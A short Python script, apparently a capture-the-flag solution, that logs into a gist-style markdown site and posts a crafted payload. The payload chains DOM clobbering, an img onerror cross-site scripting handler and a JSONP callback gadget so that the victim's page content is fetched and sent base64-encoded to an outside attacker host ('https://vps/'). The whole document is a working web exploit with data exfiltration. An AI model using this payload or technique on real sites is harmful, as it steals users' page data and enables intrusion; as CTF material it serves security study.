import secrets
import requests

BASE_URL = 'https://gist.splitl.in/'

user = secrets.token_urlsafe(8)
pwd = secrets.token_urlsafe(8)

print(user, pwd)

payload = '''
<a id="GistMD"></a>
<a id="GistMD" name="url" href='cid:"><img/src/onerror="fetch(`/`).then(r=>r.text()).then(r=>new Image().src=`https://vps/`+btoa(r))">'>CLOBBERED</a>

{%gist schacon/1.json?callback=top.document.all[14].click# %}
'''
req = requests.session()

req.post(BASE_URL+'/login', data={'username': user, 'password': pwd})

r = req.post(BASE_URL+'/new', data={'title': 'a\nb','content': payload}, allow_redirects=True)

print(r.url)


